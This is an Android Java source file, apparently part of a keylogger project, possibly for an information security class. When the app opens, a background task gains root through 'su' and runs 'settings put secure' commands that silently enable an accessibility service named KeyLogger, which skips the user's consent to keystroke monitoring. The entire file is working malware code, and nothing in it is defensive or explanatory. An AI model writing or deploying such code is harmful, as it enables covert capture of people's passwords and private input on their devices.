package com.maemresen.infsec.keylogapp;

import android.os.AsyncTask;
import android.os.Looper;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import java.io.DataOutputStream;

public class MainActivity extends AppCompatActivity {

    private final static String LOG_TAG = Helper.getLogTag(MainActivity.class);

    private class Startup extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            // this method is executed in a background thread
            // no problem calling su here
            enableAccessibility();
            return null;
        }
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        (new Startup()).execute();
    }


    private void enableAccessibility(){
        Log.i(LOG_TAG, "enableAccessibility");
        if (Looper.myLooper() == Looper.getMainLooper()) {
            Log.i(LOG_TAG, "on main thread");
        } else {
            Log.i(LOG_TAG, "not on main thread");
            try {
                Process process = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(process.getOutputStream());
                os.writeBytes("settings put secure enabled_accessibility_services com.maemresen.infsec.publisher/com.maemresen.infsec.publisher.KeyLogger\n");
                os.flush();
                os.writeBytes("settings put secure accessibility_enabled 1\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();
                process.waitFor();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

}
